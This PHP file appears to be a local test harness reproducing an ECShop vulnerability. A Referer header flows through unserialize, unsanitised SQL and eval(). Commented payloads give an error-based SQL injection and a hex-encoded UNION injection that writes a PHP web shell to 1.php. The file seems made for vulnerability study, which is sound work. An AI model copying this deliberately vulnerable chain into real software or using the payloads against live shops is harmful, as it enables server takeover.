<?php
/**
 * Created by PhpStorm.
 * User: Kevinsa
 * Date: 2018/9/12
 * Time: 上午11:25
 * 
 * mysql> desc test;
+----------+--------------+------+-----+---------+-------+
| Field    | Type         | Null | Key | Default | Extra |
+----------+--------------+------+-----+---------+-------+
| id       | int(11)      | NO   |     | NULL    |       |
| username | varchar(255) | NO   |     | NULL    |       |
| password | varchar(255) | NO   |     | NULL    |       |
+----------+--------------+------+-----+---------+-------+
 */
class EcshopTest {
    
    private function insert_mod($name)
    {
        list($fun, $para) = explode('|', $name);
        $para = unserialize($para);
        $fun = 'insert_' . $fun;

        return $this->$fun($para);
    }

    private function mysqli_conn($sql) {
        $mysqli = new mysqli('localhost','root','','test');
        if($mysqli->connect_errno) {
            echo 'mysql connect faile';
            exit();
        }
        if($result = $mysqli->query($sql)) {
            $res = $result->fetch_array(MYSQLI_ASSOC);
            $username = 'str:'.$res['username'];
            var_dump($username);
            $val = $this->fetch($username);
            return $val;
        }else{
            echo $mysqli->error;
        }
    }

    private function insert_ads($arr) {
        $sql = "select * from test where id=". $arr['id'];
        $result = $this->mysqli_conn($sql);
        return $result;
    }

    private function fetch($filename) {
        if (strncmp($filename,'str:',4) == 0) {
            $out = $this->_eval($this->fetch_str(substr($filename,4)));
            return $out;
        }
    }

    private function fetch_str($source) {
        $b = preg_replace("/{([^\}\{\n]*)}/", "\\1", $source);
        return $b;
    }

    private  function _eval($content) {
        eval(trim($content));
    }

    /*
    *Eschop SQLi测试
    */
    public function SQliTest() {
        try {
            $var = $_SERVER['HTTP_REFERER'];
            //$var = 'ads|a:2:{s:2:"id";s:43:"1 and updatexml(1,concat(0x7e,version()),1)";s:3:"num";s:1:"1";}';
            $this->insert_mod($var);
        }catch (Exception $e) {
            echo $e->getMessage();
        }
    }

    /*
    *Eschop RCE测试
    */
    public function RCETest() {
        try {
            $var = $_SERVER['HTTP_REFERER'];
            #$var = "ads|a:2:{s:2:\"id\";s:227:\"'' union select 1,0x617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A7A4575634768774A79776E50443977614841675A585A686243676B58314250553152624D544D7A4E3130704F79412F506963702729293B,3;\";s:3:\"num\";i:1;}";
            $this->insert_mod($var);
        }catch (Exception $e) {
            $e->getMessage();
        }
    }
}
$a = new EcshopTest();
#$a->RCETest();
$a->SQliTest();
